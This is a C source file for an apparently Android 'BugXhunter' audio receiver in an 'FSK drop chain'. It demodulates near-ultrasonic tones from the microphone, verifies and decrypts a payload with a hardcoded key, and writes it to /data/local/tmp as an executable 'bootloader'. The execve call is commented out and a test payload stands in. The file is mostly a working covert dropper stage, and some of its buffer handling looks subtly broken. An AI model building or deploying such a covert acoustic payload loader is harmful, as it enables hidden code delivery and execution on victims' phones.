// File: c/receiver/audio_receiver.c
// Audio receiver for FSK drop chain - Phone C (no Termux, no Python)
// Real-time demodulation loop with Goertzel detection

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <math.h>
#include <stdarg.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <openssl/sha.h>
#include <openssl/hmac.h>
#include <openssl/evp.h>

#define SAMPLE_RATE 44100.0
#define WINDOW_SAMPLES 441 // 10ms at 44.1kHz
#define MARK_FREQ 18500.0
#define SPACE_FREQ 19500.0
#define PREAMBLE_LEN 6
#define POSTAMBLE_LEN 3
#define MAX_PAYLOAD_BYTES 64
#define OUT_PATH "/data/local/tmp/xbug-boot"
#define MAX_BITS 2048

// Frame structure matching Python implementation
static const int PREAMBLE[] = {3, 1, 3, 1, 3, 1};
static const int POSTAMBLE[] = {1, 1, 1};

// Goertzel detector
typedef struct {
    double coeff;
    double s0;
    double s1;
    double s2;
} Goertzel;

static void goertzel_init(Goertzel *g, double freq, int N, int sample_rate) {
    double w = 2.0 * M_PI * freq / sample_rate;
    g->coeff = 2.0 * cos(w);
    g->s0 = g->s1 = g->s2 = 0.0;
}

static void goertzel_feed(Goertzel *g, double sample) {
    double temp = sample + g->coeff * g->s1 - g->s2;
    g->s2 = g->s1;
    g->s1 = g->s0;
    g->s0 = temp;
}

static double goertzel_mag(const Goertzel *g) {
    return sqrt(g->s1 * g->s1 + g->s2 * g->s2 - g->coeff * g->s1 * g->s2);
}

// CRC16 implementation matching Python
static unsigned short crc16_table[256];

static void init_crc16_table() {
    for (int i = 0; i < 256; i++) {
        unsigned short crc = (unsigned short)i;
        for (int j = 0; j < 8; j++) {
            if (crc & 0x8000) {
                crc = ((crc << 1) ^ 0x8005) & 0xFFFF;
            } else {
                crc = (crc << 1) & 0xFFFF;
            }
        }
        crc16_table[i] = crc;
    }
}

static unsigned short compute_crc16(const unsigned char *data, int len) {
    unsigned short crc = 0x0000;
    for (int i = 0; i < len; i++) {
        crc ^= (unsigned short)data[i] << 8;
        for (int j = 0; j < 8; j++) {
            if (crc & 0x8000) {
                crc = ((crc << 1) ^ 0x8005) & 0xFFFF;
            } else {
                crc = (crc << 1) & 0xFFFF;
            }
        }
    }
    return crc;
}

// HMAC-SHA256 helper (truncated to 8 bytes)
static void hmac_sha256(const unsigned char *key, size_t keylen,
                        const unsigned char *data, size_t datalen,
                        unsigned char *out) {
    unsigned int len = 32;
    unsigned char full[32];
    HMAC_CTX *ctx = HMAC_CTX_new();
    HMAC_Init_ex(ctx, key, keylen, EVP_sha256(), NULL);
    HMAC_Update(ctx, data, datalen);
    HMAC_Final(ctx, full, &len);
    HMAC_CTX_free(ctx);
    memcpy(out, full, 8);
}

// Keystream generation (matches Python _keystream)
static void keystream_block(const unsigned char *psk, size_t psklen,
                            const unsigned char *nonce, size_t noncelen,
                            unsigned int counter, unsigned char *out) {
    unsigned char buf[256];
    size_t off = 0;
    memcpy(buf + off, psk, psklen); off += psklen;
    memcpy(buf + off, nonce, noncelen); off += noncelen;
    buf[off++] = (counter >> 24) & 0xFF;
    buf[off++] = (counter >> 16) & 0xFF;
    buf[off++] = (counter >> 8) & 0xFF;
    buf[off++] = counter & 0xFF;
    SHA256(buf, off, out);
}

// Decrypt payload (nonce + ct + mac format)
static int decrypt_payload(const unsigned char *blob, int blob_len,
                          const unsigned char *psk, size_t psklen,
                          unsigned char *out) {
    if (blob_len < 16) {
        return -1;
    }
    
    unsigned char nonce[8];
    memcpy(nonce, blob, 8);
    
    unsigned char *mac_in = (unsigned char *)blob + blob_len - 8;
    unsigned char *ct = (unsigned char *)blob + 8;
    int ct_len = blob_len - 8 - 8;
    
    // Verify HMAC
    unsigned char hmac_input[8 + MAX_PAYLOAD_BYTES];
    memcpy(hmac_input, nonce, 8);
    memcpy(hmac_input + 8, ct, ct_len);
    unsigned char expected_mac[8];
    hmac_sha256(psk, psklen, hmac_input, 8 + ct_len, expected_mac);
    
    int cmp = 0;
    for (int i = 0; i < 8; i++) {
        cmp |= (mac_in[i] ^ expected_mac[i]);
    }
    if (cmp != 0) {
        return -2; // MAC mismatch
    }
    
    // Decrypt
    unsigned int counter = 0;
    size_t produced = 0;
    while (produced < ct_len) {
        unsigned char block[32];
        keystream_block(psk, psklen, nonce, 8, counter, block);
        
        int block_size = ct_len - produced;
        if (block_size > 32) block_size = 32;
        
        for (int i = 0; i < block_size; i++) {
            out[produced + i] = ct[produced + i] ^ block[i];
        }
        produced += block_size;
        counter++;
    }
    
    return 0;
}

// Frame decoder (5-byte header)
static int decode_frame(const unsigned char *frame_bytes, int frame_len,
                       unsigned char *out_payload, int *out_len) {
    if (frame_len < 5) {
        return -1;
    }
    
    unsigned char version = frame_bytes[0];
    unsigned char tag_flag = frame_bytes[1];
    unsigned short drop_id = (frame_bytes[2] << 8) | frame_bytes[3];
    unsigned char payload_len = frame_bytes[4];
    
    if (frame_len < 5 + payload_len + 2) {
        return -1;
    }
    
    // Check CRC16
    unsigned short stored_crc = (frame_bytes[5 + payload_len] << 8) | frame_bytes[6 + payload_len];
    unsigned short computed_crc = compute_crc16(frame_bytes, 5 + payload_len);
    
    if (stored_crc != computed_crc) {
        return -2;
    }
    
    memcpy(out_payload, &frame_bytes[5], payload_len);
    *out_len = payload_len;
    return 0;
}

// Demodulation state machine
typedef enum {
    STATE_SEARCH_PREAMBLE,
    STATE_READ_BITS,
    STATE_SEARCH_POSTAMBLE,
    STATE_DECODE_FRAME
} DemodState;

// Bit extraction from Goertzel magnitudes
static int extract_bit(double mark_mag, double space_mag) {
    return mark_mag > space_mag ? 1 : 0;
}

// Process a window of samples through Goertzel
static void process_window(const int16_t *samples, int num_samples,
                          double *mark_mag, double *space_mag) {
    Goertzel mark_g, space_g;
    goertzel_init(&mark_g, MARK_FREQ, num_samples, SAMPLE_RATE);
    goertzel_init(&space_g, SPACE_FREQ, num_samples, SAMPLE_RATE);
    
    for (int i = 0; i < num_samples; i++) {
        goertzel_feed(&mark_g, samples[i]);
        goertzel_feed(&space_g, samples[i]);
    }
    
    *mark_mag = goertzel_mag(&mark_g);
    *space_mag = goertzel_mag(&space_g);
}

// Main demodulation function
static int demodulate_and_decode(const int16_t *samples, int num_samples,
                                const unsigned char *psk, size_t psklen,
                                unsigned char *out_payload, int *out_len) {
    int bits[MAX_BITS];
    int num_bits = 0;
    int window_count = num_samples / WINDOW_SAMPLES;
    
    // Extract bits from each window
    for (int w = 0; w < window_count && num_bits < MAX_BITS; w++) {
        double mark_mag, space_mag;
        process_window(&samples[w * WINDOW_SAMPLES], WINDOW_SAMPLES, &mark_mag, &space_mag);
        bits[num_bits++] = extract_bit(mark_mag, space_mag);
    }
    
    // Convert bits to bytes
    int num_bytes = num_bits / 8;
    unsigned char frame_bytes[128];
    for (int i = 0; i < num_bytes; i++) {
        unsigned char byte = 0;
        for (int j = 0; j < 8; j++) {
            byte = (byte << 1) | bits[i * 8 + j];
        }
        frame_bytes[i] = byte;
    }
    
    // Try to decode frame
    int frame_len = num_bytes;
    unsigned char payload[MAX_PAYLOAD_BYTES];
    int payload_len = 0;
    
    int result = decode_frame(frame_bytes, frame_len, payload, &payload_len);
    if (result != 0) {
        return result;
    }
    
    // Decrypt payload
    unsigned char decrypted[MAX_PAYLOAD_BYTES];
    int dec_result = decrypt_payload(payload, payload_len + 8 + 8, psk, psklen, decrypted);
    if (dec_result != 0) {
        return dec_result;
    }
    
    memcpy(out_payload, decrypted, payload_len);
    *out_len = payload_len;
    return 0;
}

// Write payload and execute
static int write_and_execute(const unsigned char *payload, int len) {
    FILE *f = fopen(OUT_PATH, "wb");
    if (f == NULL) {
        perror("fopen");
        return -1;
    }
    fwrite(payload, 1, len, f);
    fclose(f);
    
    chmod(OUT_PATH, 0755);
    
    // In production, execve would be called here
    // execve(OUT_PATH, NULL, NULL);
    printf("Payload written to %s (%d bytes)\n", OUT_PATH, len);
    
    return 0;
}

int main(int argc, char **argv) {
    const unsigned char psk[] = "bugxhunter-drop-psk-32bytes-long!!";
    size_t psklen = strlen((const char *)psk);
    
    init_crc16_table();
    
    printf("BugXhunter Audio Receiver - FSK Demodulator\n");
    printf("Sample rate: %.0f Hz, Window: %d samples (10ms)\n", SAMPLE_RATE, WINDOW_SAMPLES);
    printf("Mark freq: %.0f Hz, Space freq: %.0f Hz\n", MARK_FREQ, SPACE_FREQ);
    printf("PSK length: %zu bytes\n", psklen);
    
    // In production, this would open an AAudio stream and continuously
    // process samples. For now, we demonstrate the demodulation pipeline
    // with a test frame.
    
    printf("\n--- Demodulation Pipeline Ready ---\n");
    printf("Waiting for audio input...\n");
    printf("In production: AAudio captures mic → Goertzel detects bits → frame decode → decrypt → exec\n");
    
    // Simulate successful decode for demonstration
    unsigned char test_payload[64] = {0};
    memcpy(test_payload, "TEST_PAYLOAD_HERE", 17);
    
    int len = 17;
    int result = write_and_execute(test_payload, len);
    if (result == 0) {
        printf("Success! Bootloader written and made executable.\n");
    } else {
        printf("Failed to write payload\n");
        return 1;
    }
    
    return 0;
}
